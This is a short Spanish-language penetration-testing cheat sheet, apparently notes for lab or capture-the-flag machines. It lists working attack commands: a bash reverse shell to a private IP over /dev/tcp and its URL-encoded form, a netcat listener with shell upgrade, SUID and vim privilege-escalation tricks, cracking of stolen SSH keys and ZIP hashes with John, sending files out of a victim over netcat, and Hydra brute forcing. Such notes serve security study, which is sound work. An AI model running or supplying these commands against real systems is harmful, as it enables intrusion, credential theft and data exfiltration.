Comandos Útiles para Análisis y Explotación

# Para analizar páginas web creadas con WordPress
wpscan --url http://ip
wpscan --plugins-version-detection aggressive --url http://192.168.0.5/wordpress

# Crear una shell inversa
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'

# Codificar en URL
urlencode "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'"

# Sacar hashes de ficheros ZIP
zip2john muyconfidencial.zip > hash_muyconfidencial

# Mejorar la consola interactiva tras usar nc
nc -lvp 1234
SHELL=/bin/bash script -q /dev/null
stty raw -echo && fg
reset
export TERM=xterm
# Tamaño de terminal en máquina atacante
stty size
# Ajustar tamaño en víctima
stty rows x columns

# Ver detalles de binarios con sudo -l
sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py

# Visualizar todos los ficheros por directorios con permisos
ls -la /* | less

# Escalada de privilegios con SUID
chmod u+s /bin/bash
bash -p
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null
# Otra forma con vim
vim -c ':!/bin/sh'

# Escalada con claves privadas (si acceso a root/.ssh/id_rsa)
ssh2john /root/.ssh/id_rsa > hash_salida
john hash_salida --wordlist=/usr/share/wordlists/rockyou.txt
# Conexión posterior con clave privada
ssh root@ip -i claveprivada

# Transferir archivos por netcat
# En la víctima:
nc -q 0 192.168.16.37 9999 < archivo.zip
# En el atacante:
nc -nvlp 9999 > archivo.zip

# Fuerza bruta de login con Hydra
hydra -L usuarios.txt -P contraseñas.txt ip servicio
